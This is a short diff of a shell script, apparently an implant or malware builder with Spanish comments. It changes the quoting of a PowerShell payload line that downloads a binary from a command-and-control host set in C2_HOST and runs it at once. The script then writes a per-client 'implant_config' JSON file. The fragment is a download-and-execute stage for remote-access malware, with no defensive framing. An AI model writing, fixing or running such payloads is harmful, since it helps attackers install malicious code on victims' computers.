@@ -5691,7 +5691,7 @@ BINARY_PATH="$(pwd)/${OUTPUT}"
 WORKING_PATH="$(pwd)"
 
 # === PAYLOAD (usando C2_HOST y OUTPUT) ===
-PAYLOAD="powershell -c \"Invoke-WebRequest 'http://${C2_HOST}/${OUTPUT}' -OutFile '${OUTPUT}'; Start-Process '${OUTPUT}'\""
+PAYLOAD="powershell -c 'Invoke-WebRequest 'http://${C2_HOST}/${OUTPUT}' -OutFile '${OUTPUT}'; Start-Process '${OUTPUT}''"
 
 # === GENERAR EL ARCHIVO JSON ===
 cat > implant_config_$CLIENT_ID.json << EOF
